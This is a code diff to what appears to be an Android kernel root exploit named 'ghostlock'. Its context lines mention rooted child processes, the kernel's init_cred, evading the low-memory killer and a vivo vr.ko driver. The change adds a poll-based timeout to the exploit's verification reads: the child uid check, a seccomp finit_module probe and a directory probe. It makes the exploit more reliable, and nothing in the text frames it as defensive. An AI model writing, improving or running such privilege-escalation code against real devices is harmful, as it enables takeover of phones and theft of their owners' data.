@@ -10,8 +10,18 @@
 #include "support/native_resource.hpp"
 
 #include <array>
+#include <poll.h>
 
 namespace ghostlock::session::victim {
+    /* Bounded verify read: a zombified child (vivo vr.ko tagB) leaves the
+     * uid pipe silent forever, and the stock blocking read hangs the run. */
+    static int32_t read_verify_timeout(int fd, void *buf, size_t bytes) {
+        struct pollfd pfd{};
+        pfd.fd = fd;
+        pfd.events = POLLIN;
+        if (poll(&pfd, 1, 3000) <= 0) return -1;
+        return static_cast<int32_t>(read(fd, buf, bytes));
+    }
     /* rooted exits kfree the static init_cred (w2 stores it with no
  * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
     static void park_child_process_forever(void) {
@@ -213,8 +223,10 @@ namespace ghostlock::session::victim {
         if (write(stage->pipes.cmd_write.get(), "C", 1) != 1) return 0;
 
         uint32_t child_uid = 9999;
-        if (read(stage->pipes.uid_read.get(), &child_uid, sizeof(child_uid)) !=
+        if (read_verify_timeout(stage->pipes.uid_read.get(), &child_uid,
+                                sizeof(child_uid)) !=
             static_cast<ssize_t>(sizeof(child_uid))) {
+            pr_warning("child uid read timed out (3s); child silent\n");
             return 0;
         }
         pr_info("child uid = %u\n", child_uid);
@@ -228,8 +240,9 @@ namespace ghostlock::session::victim {
         if (write(stage->pipes.cmd_write.get(), "F", 1) != 1) return 0;
 
         uint32_t code = 0;
-        if (read(stage->pipes.uid_read.get(), &code, sizeof(code)) !=
+        if (read_verify_timeout(stage->pipes.uid_read.get(), &code, sizeof(code)) !=
             static_cast<ssize_t>(sizeof(code))) {
+            pr_warning("seccomp probe read timed out (3s)\n");
             return 0;
         }
         pr_info("seccomp finit_module probe = 0x%x\n", code);
@@ -249,8 +262,9 @@ namespace ghostlock::session::victim {
         if (write(stage->pipes.cmd_write.get(), "M", 1) != 1) return 0;
 
         uint32_t report = 0;
-        if (read(stage->pipes.uid_read.get(), &report, sizeof(report)) !=
+        if (read_verify_timeout(stage->pipes.uid_read.get(), &report, sizeof(report)) !=
             static_cast<ssize_t>(sizeof(report))) {
+            pr_warning("leaf dir probe read timed out (3s)\n");
             return 0;
         }
         size_t len = (report >> 8) & 0xff;
